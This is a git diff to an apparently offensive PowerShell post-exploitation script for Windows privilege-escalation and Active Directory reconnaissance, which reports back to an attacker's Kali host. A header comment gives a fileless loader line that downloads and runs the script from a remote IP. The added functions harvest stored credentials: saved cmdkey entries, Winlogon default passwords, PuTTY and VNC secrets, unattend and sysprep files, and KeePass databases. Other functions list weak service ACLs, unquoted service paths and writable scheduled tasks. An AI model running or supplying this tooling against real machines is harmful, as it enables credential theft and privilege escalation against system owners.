@@ -3,6 +3,35 @@
 # iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
 #
 
+
+
+Add-Type  @"
+  [System.FlagsAttribute]
+  public enum ServiceAccessFlags : uint
+  {
+      QueryConfig = 1,
+      ChangeConfig = 2,
+      QueryStatus = 4,
+      EnumerateDependents = 8,
+      Start = 16,
+      Stop = 32,
+      PauseContinue = 64,
+      Interrogate = 128,
+      UserDefinedControl = 256,
+      Delete = 65536,
+      ReadControl = 131072,
+      WriteDac = 262144,
+      WriteOwner = 524288,
+      Synchronize = 1048576,
+      AccessSystemSecurity = 16777216,
+      GenericAll = 268435456,
+      GenericExecute = 536870912,
+      GenericWrite = 1073741824,
+      GenericRead = 2147483648
+  }
+"@
+
+
 $IP_KALI="{IP_KALI}"
 
 #------------------------------------------------------
@@ -17,6 +46,11 @@ function recon.help
     Write-Host '    - aux.download [file]             : Perform GET to retrieve files'
     Write-Host ''
     Write-Host '[*] Auxiliary Recon:'
+    Write-Host '    - recon.ports                     : Internal ports enumeration'
+    Write-Host '    - recon.basics                    : Basic system information'
+    Write-Host '    - recon.files                     : Sensitive file discovery'
+    Write-Host '    - recon.registry                  : Registry reconnaissance'
+    Write-Host '    - recon.unattend                  : Search for unattended files'
     Write-Host '    - recon.dateScan                  : Files modified between two dates'
     Write-Host '    - recon.dateLast                  : Files modified less than 15 minutes ago'
     Write-Host '    - recon.portscan <host> [1-1024]  : Perform port scanning'
@@ -34,6 +68,10 @@ function recon.help
     Write-Host '    - recon.acl                       : File permission information'
     Write-Host ''
     Write-Host '[*] Privesc Recon:'
+    Write-Host '    - priv.serv.acl                   : ACLs od services'
+    Write-Host '    - priv.path.hijack                : Path hijacking'
+    Write-Host '    - priv.schedtask                  : Scheduled tasks'
+    Write-Host '    - priv.startup                    : Startup tasks'
     Write-Host '    - priv.installElev                : AlwaysInstallElevated privilege'
     Write-Host '    - priv.serv.dir                   : Service directory privilege'
     Write-Host '    - priv.serv.reg                   : Service registry privilege'
@@ -48,6 +86,13 @@ function recon.help
     Write-Host '    - priv.search.events              : Credential in events (Admin.) privilege'
     Write-Host '    - priv.autorun                    : Scheduled tasks privilege'
     Write-Host ''
+
+    Write-Host '[*] Logon sessions:'
+    Write-Host '    - Get-LogonSessionProcesses        : Retrieve processes associated with logon sessions'
+    Write-Host '    - Get-LogonSessionProc             : Shortcut for detailed logon session process info'
+    Write-Host '    - Get-LogonSession                 : Retrieve active logon sessions'
+    Write-Host ''
+
     Write-Host '[*] AD Recon:'
     Write-Host '    - ad.psremote                     : Remote PowerShell privilege'
     Write-Host '    - ad.computers                    : Domain computers privilege'
@@ -61,6 +106,7 @@ function recon.help
     Write-Host ''
     Write-Host ''
  }
+
 
 
 #------------------------------------------
@@ -107,6 +153,111 @@ function aux.download {
 function recon.dateLast(){
     Get-ChildItem / -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-15) } | Select LastWriteTime,FullName | Format-Table -AutoSize
 }
+
+
+
+
+function recon.basics(){
+    param (
+        [string]$startDate,
+        [string]$endDate
+    )
+
+    $executioncontext.sessionstate.languagemode
+    whoami /all
+    cmdkey /list
+    query user
+    net share
+    Get-PSDrive
+}
+
+
+function recon.files(){
+
+    Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini,*.exe,*.dll,*.sys,*.msi -File -Recurse -ErrorAction SilentlyContinue
+    gci -Path C:\ -Include *.kdbx,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+    Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+    Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+    Get-Childitem C:\inetpub\logs\LogFiles\*
+    Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
+}
+
+function recon.registry(){
+    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>$NUL
+    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+    reg query "HKCU\Software\ORL\WinVNC3\Password"
+    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password"
+}
+
+function recon.unattend(){
+    Get-Childitem "C:\" -Include ("*unattend*","*sysprep*") -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
+    Get-ChildItem -Path C:\ -Recurse -Include "sysprep.inf", "sysprep.xml", "unattended.xml", "unattend.xml", "unattend.txt" -ErrorAction SilentlyContinue
+}
+
+
+#------------------------------------------
+#  * Internal ports *
+#------------------------------------------
+
+function recon.ports(){
+    Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property LocalAddress, LocalPort, ProcessName
+}
+
+#------------------------------------------
+#  * Insecure Service Executables *
+#------------------------------------------
+
+function priv.serv.exec(){
+
+    get-ciminstance -ClassName win32_service | select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+}
+
+#------------------------------------------
+#  * Service bin path modificable *
+#------------------------------------------
+
+function priv.serv.acl(){
+
+        param (
+        [string]$name
+    )
+    
+    Get-ServiceAcl -Name $name | select -expand Access
+}
+
+
+function priv.path.hijack(){
+
+    $env:Path
+}
+
+
+function priv.schedtask(){
+
+    Get-ScheduledTask | where {$_.principal.RunLevel -eq "Highest"} | Where-Object {$Null -ne $_.Actions.Execute} | ft TaskName,TaskPath,State
+    Get-ScheduledTask -ErrorAction Ignore | where {$_.principal.RunLevel -eq "Highest"} | Where-Object {$Null -ne $_.Actions.Execute} | ForEach-Object { if(ModifiablePath $_.Actions.Execute){ $_ } }
+}
+
+
+
+function priv.startup(){
+
+    Get-ChildItem -Path "C:\Users" | Where-Object { $_.PSIsContainer } | ForEach-Object {
+    $user = $_.Name
+    $startupPath = "C:\Users\$user\Start Menu\Programs\Startup"
+    
+    if (Test-Path $startupPath) {
+        Write-Host "Contenido de $startupPath para el usuario $user"
+        Get-ChildItem -Path $startupPath
+    } else {
+        Write-Host "No Start Up folder for $user."
+    }
+}
+
+}
+
 
 
 #------------------------------------------
@@ -415,7 +566,14 @@ function priv.serv.reg(){
 
 #Services with unquoted service path issue
 function priv.serv.unq(){
-    $vuln = Get-WmiObject -Class win32_service | Where-Object {$_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'}
+    $vuln1 = Get-WmiObject -Class win32_service | Where-Object {$_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'}
+    $vuln2 = Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode |
+    Where-Object { 
+        $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'
+    } | Select-Object Name, DisplayName, StartMode, PathName
+
+    $vuln = @($vuln1 + $vuln2)
+
     ForEach ($serv in $vuln) {$SplitPathArray = $serv.pathname.Split(' ');$ConcatPathArray = @();for ($i=0;$i -lt $SplitPathArray.Count; $i++) {$ConcatPathArray += $SplitPathArray[0..$i] -join ' '};if(ModifiablePath $ConcatPathArray){$serv | select Name,State,PathName}}
 }
 
@@ -838,6 +996,206 @@ function ad.asrep {
 }
 
 
+
+
+
+function Get-ServiceAcl {
+    [CmdletBinding(DefaultParameterSetName="ByName")]
+    param(
+        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ParameterSetName="ByName")]
+        [string[]] $Name,
+        [Parameter(Mandatory=$true, Position=0, ParameterSetName="ByDisplayName")]
+        [string[]] $DisplayName,
+        [Parameter(Mandatory=$false, Position=1)]
+        [string] $ComputerName = $env:COMPUTERNAME
+    )
+ 
+    # If display name was provided, get the actual service name:
+    switch ($PSCmdlet.ParameterSetName) {
+        "ByDisplayName" {
+            $Name = Get-Service -DisplayName $DisplayName -ComputerName $ComputerName -ErrorAction Stop | 
+                Select-Object -ExpandProperty Name
+        }
+    }
+ 
+    # Make sure computer has 'sc.exe':
+    $ServiceControlCmd = Get-Command "$env:SystemRoot\system32\sc.exe"
+    if (-not $ServiceControlCmd) {
+        throw "Could not find $env:SystemRoot\system32\sc.exe command!"
+    }
+ 
+    # Get-Service does the work looking up the service the user requested:
+    Get-Service -Name $Name | ForEach-Object {
+         
+        # We might need this info in catch block, so store it to a variable
+        $CurrentName = $_.Name
+ 
+        # Get SDDL using sc.exe
+        $Sddl = & $ServiceControlCmd.Definition "\\$ComputerName" sdshow "$CurrentName" | Where-Object { $_ }
+ 
+        try {
+            # Get the DACL from the SDDL string
+            $Dacl = New-Object System.Security.AccessControl.RawSecurityDescriptor($Sddl)
+        }
+        catch {
+            Write-Warning "Couldn't get security descriptor for service '$CurrentName': $Sddl"
+            return
+        }
+ 
+        # Create the custom object with the note properties
+        $CustomObject = New-Object -TypeName PSObject -Property ([ordered] @{ Name = $_.Name
+                                                                              Dacl = $Dacl
+                                                                            })
+ 
+        # Add the 'Access' property:
+        $CustomObject | Add-Member -MemberType ScriptProperty -Name Access -Value {
+            $this.Dacl.DiscretionaryAcl | ForEach-Object {
+                $CurrentDacl = $_
+ 
+                try {
+                    $IdentityReference = $CurrentDacl.SecurityIdentifier.Translate([System.Security.Principal.NTAccount])
+                }
+                catch {
+                    $IdentityReference = $CurrentDacl.SecurityIdentifier.Value
+                }
+                 
+                New-Object -TypeName PSObject -Property ([ordered] @{ 
+                                ServiceRights = [ServiceAccessFlags] $CurrentDacl.AccessMask
+                                AccessControlType = $CurrentDacl.AceType
+                                IdentityReference = $IdentityReference
+                                IsInherited = $CurrentDacl.IsInherited
+                                InheritanceFlags = $CurrentDacl.InheritanceFlags
+                                PropagationFlags = $CurrentDacl.PropagationFlags
+                                                                    })
+            }
+        }
+ 
+        # Add 'AccessToString' property that mimics a property of the same name from normal Get-Acl call
+        $CustomObject | Add-Member -MemberType ScriptProperty -Name AccessToString -Value {
+            $this.Access | ForEach-Object {
+                "{0} {1} {2}" -f $_.IdentityReference, $_.AccessControlType, $_.ServiceRights
+            } | Out-String
+        }
+ 
+        $CustomObject
+    }
+}
+
+
+
+
+function ModifiablePath {
+    param ([Parameter(Mandatory = $true)][String[]]$Paths);
+    $Sids = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Select-Object -ExpandProperty Value;$Sids += $UserIdentity.User.Value;
+    ForEach($Path in $Paths){try{$Path=$Path.Replace('"', "");
+        if (-Not(Test-Path -Path $Path -ErrorAction Stop)){
+            $Path=Split-Path -Path $Path -Parent};
+        if (Test-Path -Path $Path -ErrorAction Stop) {
+            $FILE=Resolve-Path -Path $Path | Select-Object -ExpandProperty Path;
+            Get-Acl -Path $Path | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {if($_.FileSystemRights){$Rights = $_.FileSystemRights.value__}
+        else{
+            $Rights = $_.RegistryRights.value__};if(@([uint32]'0x40000000',[uint32]'0x10000000',[uint32]'0x02000000',[uint32]'0x00080000',[uint32]'0x00040000',[uint32]'0x00000004',[uint32]'0x00000002') | Where-Object { $Rights -band $_ }){
+                if ($Sids -contains $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExcludeProperty Value) {$Path}}}}}catch{$false}}}
+
+
+#Get-LogonSession | where username -eq yamcha
+#Get-LogonSession | select Username, logontype,authenticationpackage
+
+
+function Get-LogonSession
+{
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNullOrEmpty()]
+        [string[]]
+        $ComputerName = 'localhost'
+    )
+
+    $LogonMap = @{}
+    Get-WmiObject -ComputerName $ComputerName -Class Win32_LoggedOnUser  | %{
+    
+        $Identity = $_.Antecedent | Select-String 'Domain="(.*)",Name="(.*)"'
+        $LogonSession = $_.Dependent | Select-String 'LogonId="(\d+)"'
+
+        $LogonMap[$LogonSession.Matches[0].Groups[1].Value] = New-Object PSObject -Property @{
+            Domain = $Identity.Matches[0].Groups[1].Value
+            UserName = $Identity.Matches[0].Groups[2].Value
+        }
+    }
+
+    Get-WmiObject -ComputerName $ComputerName -Class Win32_LogonSession | %{
+        $LogonType = $Null
+        switch($_.LogonType) {
+            $null {$LogonType = 'None'}
+            0 { $LogonType = 'System' }
+            2 { $LogonType = 'Interactive' }
+            3 { $LogonType = 'Network' }
+            4 { $LogonType = 'Batch' }
+            5 { $LogonType = 'Service' }
+            6 { $LogonType = 'Proxy' }
+            7 { $LogonType = 'Unlock' }
+            8 { $LogonType = 'NetworkCleartext' }
+            9 { $LogonType = 'NewCredentials' }
+            10 { $LogonType = 'RemoteInteractive' }
+            11 { $LogonType = 'CachedInteractive' }
+            12 { $LogonType = 'CachedRemoteInteractive' }
+            13 { $LogonType = 'CachedUnlock' }
+            default { $LogonType = $_.LogonType}
+        }
+
+        New-Object PSObject -Property @{
+            UserName = $LogonMap[$_.LogonId].UserName
+            Domain = $LogonMap[$_.LogonId].Domain
+            LogonId = $_.LogonId
+            LogonType = $LogonType
+            AuthenticationPackage = $_.AuthenticationPackage
+            Caption = $_.Caption
+            Description = $_.Description
+            InstallDate = $_.InstallDate
+            Name = $_.Name
+            StartTime = $_.ConvertToDateTime($_.StartTime)
+            ComputerName = $_.PSComputerName
+        }
+    }
+}
+
+
+function Get-LogonSessionProc
+{
+    [CmdletBinding()]
+    Param(
+        [Parameter(ValueFromPipelineByPropertyName=$true,
+                   Position=0)]
+        [int]
+        $Type
+    )
+
+    if($Type) {
+        Get-WmiObject Win32_LogonSession -Filter "LogonType=$Type" 
+    } else {
+        Get-WmiObject Win32_LogonSession
+    }
+}
+
+# Get-LogonSessionProcesses -id 98765
+function Get-LogonSessionProcesses
+{
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true,
+                   ValueFromPipelineByPropertyName=$true,
+                   Position=0)]
+        [int[]]
+        $Id
+    )
+  
+    foreach($LogonId in $Id)
+    {
+        Get-WmiObject -Query ("ASSOCIATORS OF {Win32_LogonSession.LogonId=$LogonId} WHERE ResultClass = Win32_Process")
+    }
+}
+
+
 function Banner {
     $banner = @'
 
@@ -867,3 +1225,6 @@ if ($IP_KALI -match "IP_KALI") {
     Write-Host ""
 }
 recon.help
+
+
+
